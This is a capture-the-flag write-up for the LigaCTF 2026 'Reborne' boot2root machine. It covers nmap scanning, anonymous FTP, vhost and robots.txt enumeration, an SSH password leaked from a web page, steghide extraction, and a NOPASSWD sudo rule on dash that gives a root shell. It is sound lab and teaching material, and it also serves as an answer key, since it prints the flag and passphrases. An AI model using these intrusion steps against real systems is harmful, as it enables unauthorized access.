---
slug: "local-ctf/ligactf2026/reborne"
event: "ligactf-2026"
title: "Reborne"
summary: "LigaCTF 2026 ligactf2026, web, forensics writeup covering Reborne with analysis, solution steps, and final recovery notes."
date: 2026-05-31
tags:
  - ctf
  - ligactf2026
  - web
  - forensics
  - boot2root
  - network
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://owasp.org/www-chapter-kuala-lumpur/owaspmy.jpeg"
---
## Challenge Information

|Field|Value|
|---|---|
|Challenge|Reborne|
|Category|Boot2Root|
|Points|968|
|Flag Format|`OWASPKL{xxx}`|
|Target IP|`[REDACTED_LOCAL_IP]`|
|Attacker Machine|Kali Linux|
|Final Flag|`OWASPKL{N1c3_t0_m33t_y0u}`|

## Objective

The objective was to compromise the provided OVA virtual machine through the intended network-accessible attack surface, obtain a user foothold, escalate privileges to root, and retrieve the final flag.

No VM disk mounting, file tampering, or out-of-band backend access was used.

---

## 1. Host Discovery and Port Scanning

After importing and booting the OVA, the target was identified as:

```bash
export IP=[REDACTED_LOCAL_IP]
```

A full TCP scan was performed:

```bash
sudo nmap -Pn -n -sV -sC -p- --min-rate 3000 $IP
```

Relevant results:

![pasted-image-20260531222935](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531222935.png)

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 Ubuntu
```

Nmap also showed that anonymous FTP login was allowed and exposed two files:

```text
Mainframe.pdf
hint.txt
```

---

## 2. FTP Enumeration

Anonymous FTP was accessible:

```bash
ftp $IP
```

Login:

```text
anonymous
anonymous
```

Files were downloaded:

```ftp
binary
ls
get hint.txt
get Mainframe.pdf
bye
```

![pasted-image-20260531223013](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531223013.png)

The `hint.txt` file was Base64 encoded:

```bash
base64 -d hint.txt
```

![pasted-image-20260531223034](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531223034.png)

The decoded content was a rickroll-style rabbit hole. `Mainframe.pdf` also did not contain useful credentials or the final flag. These files were treated as decoys.

---

## 3. Web Enumeration

The web server initially showed the Apache default page. A hidden page was discovered at:

```bash
curl -i http://$IP/home.html
```

![pasted-image-20260531223053](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531223053.png)

The page contained:

```html
<a href="http://mainframe.local">mainframe.local</a>
```

This indicated name-based virtual hosting. The hostname was added locally:

```bash
echo "[REDACTED_LOCAL_IP] mainframe.local" | sudo tee -a /etc/hosts
```

The vhost was then accessible:

```bash
curl -i http://mainframe.local/
```

The page showed a site titled:

```text
Welcome to The Mainframe
```

It also disclosed an email address:

![pasted-image-20260531223139](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531223139.png)

```text
apokalips@mainframe.local
```

This provided a likely username:

```text
apokalips
```

---

## 4. robots.txt Enumeration

The vhost exposed a useful `robots.txt` file:

```bash
curl -s http://mainframe.local/robots.txt
```

![pasted-image-20260531223156](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531223156.png)

Interesting paths included:

```text
/lfg/
/logs/
/secret/
/password.php?id=2
/login.php
/search.php
```

The `/password.php?id=2` endpoint returned a MySQL warning:

```bash
curl -i "http://mainframe.local/password.php?id=2"
```

Output:

```text
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in password.php on line 47
```

However, this was not needed for exploitation.

---

## 5. Directory Chain Discovery

The `/lfg/` directory had directory listing enabled:

```bash
curl -iL http://mainframe.local/lfg/
```

![pasted-image-20260531223226](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531223226.png)

It revealed:

```text
gohere/
```

Following the chain:

```bash
curl -iL http://mainframe.local/lfg/gohere/
curl -iL http://mainframe.local/lfg/gohere/alittlebitmore/
curl -iL http://mainframe.local/lfg/gohere/alittlebitmore/almostthere/
```

The final page contained:

![pasted-image-20260531223355](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531223355.png)

```html
<title>Maintained by Ap0k4L1p5</title>
<img src="img/Ap0k4L1p5.jpg">
<p>Made by Prof. Apokalips</br>ap0k4l1p5.github.io/talesofcred.html</p>
```

This gave two important clues:

```text
Username clue: apokalips
External tale clue: ap0k4l1p5.github.io/talesofcred.html
```

![pasted-image-20260531223619](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531223619.png)

---

## 6. Credential Discovery

The referenced tale page contained multiple suspicious leetspeak words. One of them was used as the SSH password:

![pasted-image-20260531223858](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531223858.png)

```text
Un17yW34v3r5
```

SSH login was successful:

```bash
ssh apokalips@[REDACTED_LOCAL_IP]
```

Credentials:

```text
Username: apokalips
Password: [REDACTED_PASSWORD]
```

After login:

```bash
whoami
id
ls -la
cat [REDACTED_USER_FILE]
```

![pasted-image-20260531223958](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531223958.png)

The `[REDACTED_USER_FILE]` file was not a flag:

```text
This is [REDACTED_USER_FILE] file. FYI :)
```

---

## 7. Privilege Escalation

The sudo permissions were checked:

```bash
sudo -l
```

Output:

![pasted-image-20260531224018](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531224018.png)

```text
User apokalips may run the following commands on etherborne:
    (ALL) NOPASSWD: /usr/bin/dash
```

This allowed direct root shell access:

```bash
sudo /usr/bin/dash
```

Root was confirmed:

```bash
whoami
id
```

Output:

![pasted-image-20260531224033](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531224033.png)

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

---

## 8. Root Directory Enumeration

Inside `/root`, the visible file was:

```bash
cd /root
ls
```

Output:

![pasted-image-20260531224057](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531224057.png)
The GPG file was encrypted:

```bash
file [REDACTED_ROOT_FILE].gpg
```

Output:

```text
[REDACTED_ROOT_FILE].gpg: GPG symmetrically encrypted data (AES256 cipher)
```

At this point, the image from the web directory was inspected.

---

## 9. Steganography Clue

The image was downloaded:

```bash
wget http://mainframe.local/lfg/gohere/alittlebitmore/almostthere/img/Ap0k4L1p5.jpg
```

![pasted-image-20260531224200](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531224200.png)

`steghide` showed an embedded file:

```bash
steghide info Ap0k4L1p5.jpg
```

Output:

![pasted-image-20260531224216](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531224216.png)

```text
embedded file "passphrase.txt"
```

The embedded file was extracted with a blank passphrase:

```bash
steghide extract -sf Ap0k4L1p5.jpg -p "" -xf passphrase.txt
cat passphrase.txt
```

Extracted passphrase:

![pasted-image-20260531224245](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531224245.png)

```text
H3J35'S_F0R3S4W_T4LES
```

The passphrase was used to decrypt `[REDACTED_ROOT_FILE].gpg`:

```bash
printf '%s\n' "H3J35'S_F0R3S4W_T4LES" | gpg --batch --yes --pinentry-mode loopback --passphrase-fd 0 -d /root/[REDACTED_ROOT_FILE].gpg
```

Output:

```text
You think you made it, dont you? :D
```

This confirmed that `[REDACTED_ROOT_FILE].gpg` was a decoy.

---

## 10. Final Flag Discovery

A recursive search for the flag format was performed:

```bash
grep -Rni "OWASPKL{" /root /home /var/www 2>/dev/null
```

Output:

![pasted-image-20260531224847](/images/writeups/local-ctf/ligactf2026/reborne/pasted-image-20260531224847.png)

```text
/root/.flag.txt:4:OWASPKL{N1c3_t0_m33t_y0u}
```

The hidden flag file was read:

```bash
cat /root/.flag.txt
```

Final flag:

```text
OWASPKL{N1c3_t0_m33t_y0u}
```

---

## Vulnerability Summary

|Stage|Issue|Impact|
|---|---|---|
|FTP|Anonymous FTP enabled|Exposed decoy files and rabbit-hole material|
|HTTP|Hidden `home.html` disclosed vhost|Revealed `mainframe.local`|
|HTTP|`robots.txt` exposed sensitive paths|Guided enumeration to `/lfg/`|
|HTTP|Directory listing enabled|Allowed traversal of the intended clue chain|
|Web Content|Public image contained hidden stego file|Revealed GPG passphrase clue|
|Credentials|Tale page leaked usable SSH password|Enabled SSH foothold as `apokalips`|
|Privilege Escalation|`NOPASSWD` sudo rule for `/usr/bin/dash`|Allowed immediate root shell|

---
